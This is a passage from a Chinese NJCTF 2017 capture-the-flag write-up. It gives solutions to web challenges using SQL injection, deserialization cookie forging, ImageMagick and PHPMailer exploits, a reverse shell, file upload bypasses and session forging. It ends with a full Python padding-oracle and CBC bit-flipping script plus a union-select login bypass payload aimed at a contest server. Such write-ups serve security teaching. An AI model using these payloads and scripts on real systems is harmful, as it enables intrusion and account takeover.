  v2[7] = 20 * v24 - v10;
  v2[8] = 10 * v18 | 1;
  v2[9] = v22 * v24 - 1;
  v2[10] = v6 * v14 * v10 * v10 - 4;
  v2[11] = (v10 + v14) * v24 - 5;
  v2[12] = 0;
  return v2;
}
// 
/*
PvrUa7iv3Al1
PvrUb7Fv3Al1
PvrVb7Fv3Al1
PvrVa7iv3Al1
PvrMb7Fv3Al1
PvrMa7iv3Al1
PvrNb7Fv3Al1
PvrNa7iv3Al1
PvrOb7Fv3Al1
PvrOa7iv3Al1
PvrPb7Fv3Al1
PvrPa7iv3Al1
PvrQb7Fv3Al1
PvrQa7iv3Al1
PvrRb7Fv3Al1
PvrRa7iv3Al1
PvrSb7Fv3Al1
PvrSa7iv3Al1
PvrTb7Fv3Al1
PvrTa7iv3Al1
PvrUb7Fv3Al1
PvrUa7iv3Al1
PvrVb7Fv3Al1
PvrVa7iv3Al1
PvrMb7Fv3Al1
PvrMa7iv3Al1
PvrNb7Fv3Al1
PvrNa7iv3Al1
PvrOb7Fv3Al1
PvrOa7iv3Al1
PvrPb7Fv3Al1
PvrPa7iv3Al1
PvrQb7Fv3Al1
PvrQa7iv3Al1
PvrRb7Fv3Al1
PvrRa7iv3Al1
PvrSb7Fv3Al1
PvrSa7iv3Al1
PvrTb7Fv3Al1
PvrTa7iv3Al1
PvrUb7Fv3Al1
PvrUa7iv3Al1
PvrVb7Fv3Al1
*/
int main()
{
  char out[256],flag = 0;
  for(unsigned int i=0;i&lt;=4294967295-1 ;++i)
  {
    flag = 0;
    memset(out,0,256);
    flg(i ,out);
    if(strlen(out)&gt;=10)
    {
      for(int j=0;j&lt;12;++j)
      {
        if((out[j]&gt;='a'&amp;&amp;out[j]&lt;='z')  || (out[j]&gt;='A'&amp;&amp;out[j]&lt;='Z') || (out[j]&gt;='0'&amp;&amp;out[j]&lt;='9')|| out[j]=='_' )
          continue;
        else
        {
          flag = 1;
          break;
        }
      }
      if(flag == 0)
        printf("%sn",out);
    }
  }
  return 0;  
}
```

爆破了下有多种情况，一个个试过去可以找到真正的flag

<br>

**WEB**

**Wallet**

www.zip下载源码，密码弱口令，njctf2017，下载源码后解密即可：

发现关键判断是sha1==md5，于是找两个值都为0e的即可

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01dac7cbc71aa415b7.png)

然后分析源码，发现是个简单的sql注入，然后得到flag

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f59beae74be51d1f.png)

**Text wall**

存在备份文件：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a349bb8c1ef42d81.png)

发现是一个任意文件读取，然后抓下包看下cookie，发现由两部分构成，后面部分是反序列化数据，前面部分是反序列化值得sha1值，先读了下index，得到flag文件位置，然后再本地构造一下拿到flag：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017ec353e0e2b67259.png)

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018b01409b238bbc91.png)

**Be Logical**

三部分：逻辑漏洞-&gt;ImageMagick-&gt;PHPMailer

逻辑漏洞：

先add1，然后在refund后将point改为1e5，就有了积分：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0141d20c211cce4b9c.png)

然后再去购买服务即可：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0192128fc6b800ff77.png)

**ImageMagick：**

上传png图片发现会被转成bmp，猜测是imagemagick漏洞，于是直接开个reverse shell：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c1c5e783d0580dfe.png)

**PHPMailer**

但是比较尴尬的是没找到flag，于是探测内网，发现19存活主机，curl请求下：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0158ae0c632b62e18b.png)

猜测是PHPMailer漏洞，根目录不可写，存在uploads目录，但是一句话写进去无法执行，猜测做了权限设置，但是phpmailer在处理时应该是一个比较高的权限，于是写了多个文件去读，最后拿到flag：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d078558d280910d9.png)

**Come On**

宽字节的like盲注，写个脚本跑就好了：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a2708b1f34d3102f.png)

**Chall I**

拿到题目，没有什么特别的思路，试了试nodejs反序列化命令执行也不行，在google上找了找，找到了这个[https://www.smrrd.de/nodejs-hacking-challenge-writeup.html](https://www.smrrd.de/nodejs-hacking-challenge-writeup.html)  ，几乎跟题目是一样的思路，但是问题在于原来的题目没有对password进行md5，新的题目进行了md5。

又根据

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d9114b3725625160.png)

于是想到寻找一个md5之后全部为数字的password，提交之后就会产生内存泄露。

脚本如下：



```
import hashlib
b='-=[],./;"abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
a=""
def find(str1):
    print str1
    flag=0
    for i in hashlib.md5(str1).hexdigest():
        if i&gt;'9':
            flag=1;
            break
    if flag==0:
        print "====================================================="
        print str1
        print hashlib.md5(str1).hexdigest()
        input("success")
    if(len(str1)&gt;3):
        return
    else:
        for i in b:
            find(str1+i)
if __name__ == '__main__':
    find(a)
```

找到一个c;Iy，多次提交之后拿到flag：NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver}。

**Chall II**

之后就是从[https://www.smrrd.de/data/nodejs_hacking_challenge/nodejs_chall.zip](https://www.smrrd.de/data/nodejs_hacking_challenge/nodejs_chall.zip)  下载源码，把secret_key改成NJCTF{P1e45e_s3arch_th1s_s0urce_cod3_0lddriver}之后登陆，得到session和session.sig分别为session=eyJhZG1pbiI6InllcyJ9; session.sig=DLXp3JcD1oX3c8v4pUgOAn-pDYo;成功登陆成admin，之后解base64中文得到flag

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01625830e51854531b.png)

**Guess：**

题目很简单，首先是一个lfi问价包含拿到upload的源码和index的源码，根据index发现不能跨目录，而且upload过滤很严格。漏洞在于

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e1a05bc8364eeb8d.png)

当phpsession设置为空，这样session_id()就为空了，于是可以cmd5解开$hash求知$ss，然后利用php_mt_seed这个工具爆破出来种子，就可以推测出文件名。

预测文件名的脚本如下：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01498a1ecb37d5250f.png)

然后于是利用zip伪协议getshell拿到flag：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0172858030d3e9fced.png)

**blog：**

题目源码下载下来之后，看到这个注册的时候参数解析有一个admin

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01468f73a0f95b106a.png)

同时发现



```
&lt;li&gt;
&lt;%= gravatar_for user, size: 52 %&gt;
&lt;%= link_to user.name, user %&gt;
&lt;!--flag is here--&gt;
&lt;% if current_user.admin? &amp;&amp; !current_user?(user) %&gt;
  | &lt;%= link_to "delete", user, method: :delete,
    data: { confirm: "You sure?" } %&gt;
&lt;% end %&gt;
&lt;/li&gt;
```

这个应该是在delete用户的地方触发的。又因为注册时候是user[password],user[email]这样的格式，于是构造user[admin]=1成功登陆，并拿到flag

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f319ae2ef303fdfb.jpg)

**Get Flag**

&amp;号后可以拼接命令，导致列目录

同时代码本身存在LFI，于是读到flag：

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fc13b7fb3dad9b8a.png)

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0119e55cbce26208c1.png)

**picture wall**

题目开始没有get到点，后来fuzz的时候发现修改host为127.0.0.1的时候可以上传图片，发现后缀名应该是黑名单的过滤，因为我上传一个ppp之类的都行，于是开始测试，发现php,php3,php4,php5都被过滤了，但是phtml没有过滤，但是直接写shell提示是php文件，于是想到去年RCTF2015的那个题目，用&lt;script language=‘php’&gt;直接拿到shell，然后向上两层在html的同级目录找到flag 

忘记截图了…

Login

注册admin+n多空格+a字符的用户即可成功，其实就是注册时拼接到数据库时有长度限制，导致

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014fa84a2094ef813f.png)

**be admin**

首先发现是存在备份文件index.php.bak。打开之后发现题目很熟悉，根据这个找到应该是今年sessionctf2016那个biscuiti的改编。首先根据流程，首先是使用username= ' union select 'albert','1' %23&amp;password=伪造登录，登录之后就是实现padding oracle attack了，原理如下图

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015d052d622778af83.png)

[![](./img/85691/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d8ececc37f029891.png)

所以就可以在login哪里触发padding oracle,然后CBC翻转伪造为admin

脚本如下



```
import requests
import base64
import time
url='http://218.2.197.235:23737/'
N=16
phpsession=""
ID=""
def inject1(password):
    param={'username':"' union select 'albert','{password}".format(password=password),'password':''}
    result=requests.post(url,data=param)
    return result
def inject_token(token):
    header={"Cookie":"PHPSESSID="+phpsession+";token="+token+";ID="+ID}
    result=requests.post(url,headers=header)
    return result
def xor(a, b):
    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
def pad(string,N):
    l=len(string)
    if l!=N:
        return string+chr(N-l)*(N-l)
def padding_oracle(N,cipher):
    get=""
    for i in xrange(1,N+1):
        for j in xrange(0,256):
            padding=xor(get,chr(i)*(i-1))
            c=chr(0)*(16-i)+chr(j)+padding+cipher
            print c.encode('hex')
            result=inject1(base64.b64encode(chr(0)*16+c))
            if "ctfer" not in result.content:
                get=chr(j^i)+get
                # time.sleep(0.1)
                break
    return get
session=inject1("aaaaa").headers['set-cookie'].split(',')
phpsession=session[0].split(";")[0][10:]
print phpsession
ID=session[1][4:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
token=session[2][6:].replace("%3D",'=').replace("%2F",'/').replace("%2B",'+').decode('base64')
middle=""
middle=padding_oracle(N,ID)
print "ID:"+ID.encode('base64')
print "token:"+token.encode('base64')
print "middle:"+middle.encode('base64')
print "phpsession:"+phpsession
print "n"
if(len(middle)==16):
    plaintext=xor(middle,token);
    print plaintext.encode('base64')
    des=pad('admin',N)
    tmp=""
    print des.encode("base64")
    for i in xrange(16):
        tmp+=chr(ord(token[i])^ord(plaintext[i])^ord(des[i]))
    print tmp.encode('base64')
    result=inject_token(base64.b64encode(tmp))
    print result.content
    if "flag" in result.content or "NJCTF" in result.content or 'njctf' in result.content:
        input("success")
```


